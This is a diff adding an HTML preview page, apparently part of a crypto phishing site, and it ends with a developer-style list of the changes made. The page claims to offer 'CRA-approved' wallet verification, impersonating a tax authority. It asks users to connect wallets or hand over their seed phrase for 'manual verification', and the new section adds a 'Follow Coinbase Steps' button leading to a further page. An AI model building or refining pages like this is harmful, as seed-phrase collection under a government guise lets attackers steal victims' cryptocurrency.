@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Validation Preview - New Coinbase Section</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&family=Lato:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body { font-family: 'Noto Sans', sans-serif; color: #333; }
+  </style>
+</head>
+<body class="bg-gray-100 p-8">
+  <div class="max-w-6xl mx-auto">
+    <div class="bg-yellow-100 border-l-4 border-yellow-500 p-4 mb-6">
+      <p class="font-bold">📋 PREVIEW: New Coinbase Section Added Below "Connect Sign-in Partner" Button</p>
+    </div>
+
+    <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+      <section class="border border-gray-200 rounded-lg p-6 bg-gray-50">
+        <h2 class="text-2xl font-bold mb-4">Automatic verification</h2>
+        <p class="mb-6 text-gray-700">Securely connect your wallet through a CRA-approved crypto sign-in partner. This is the fastest way to validate your holdings.</p>
+        <div class="space-y-3 mb-6">
+          <div class="flex items-center gap-2 text-sm text-gray-600">
+            <i class="fas fa-check text-green-600"></i> Supports: Exodus, MetaMask, Coinbase, TrustWallet, Ledger Live &nbsp;|&nbsp; <span class="text-gray-500">Stablecoins only (USDT, USDC, etc.)</span>
+          </div>
+        </div>
+        <button class="bg-[#335075] text-white px-6 py-2 rounded font-bold hover:bg-[#26374a] w-full flex items-center justify-center gap-2">
+          <i class="fas fa-link"></i> Connect Sign-in Partner
+        </button>
+
+        <!-- NEW: Coinbase-specific section -->
+        <div class="mt-6 border-l-4 border-blue-500 bg-blue-50 p-4 rounded-r">
+          <div class="flex items-start gap-3">
+            <i class="fas fa-info-circle text-blue-600 mt-1"></i>
+            <div class="flex-1">
+              <h3 class="font-bold text-gray-800 mb-2">Using Coinbase?</h3>
+              <p class="text-sm text-gray-700 mb-3">Coinbase linking is different from other wallets and requires additional steps for secure verification.</p>
+              <button onclick="alert('Will redirect to: coinbase-verification.html')" class="bg-blue-600 text-white px-4 py-2 rounded text-sm font-bold hover:bg-blue-700 flex items-center gap-2">
+                <i class="fas fa-arrow-right"></i> Follow Coinbase Steps
+              </button>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section class="border border-gray-200 rounded-lg p-6">
+        <h2 class="text-2xl font-bold mb-4">Manual verification</h2>
+        <p class="text-gray-700 mb-4">Provide your wallet information and seed phrase to verify your declared amounts.</p>
+        <div class="bg-gray-100 p-4 rounded text-sm text-gray-600">
+          [Manual verification form fields...]
+        </div>
+      </section>
+    </div>
+
+    <div class="mt-8 bg-green-100 border-l-4 border-green-500 p-4">
+      <p class="font-bold text-green-800">✅ Changes Made:</p>
+      <ul class="list-disc ml-6 mt-2 text-green-800">
+        <li>Added blue info box with "Using Coinbase?" heading</li>
+        <li>Included explanation text about different linking process</li>
+        <li>Added blue button "Follow Coinbase Steps" that links to coinbase-verification.html</li>
+        <li>Styled with blue theme to differentiate from main CRA buttons</li>
+        <li>Uses Font Awesome info icon for visual clarity</li>
+      </ul>
+    </div>
+  </div>
+</body>
+</html>
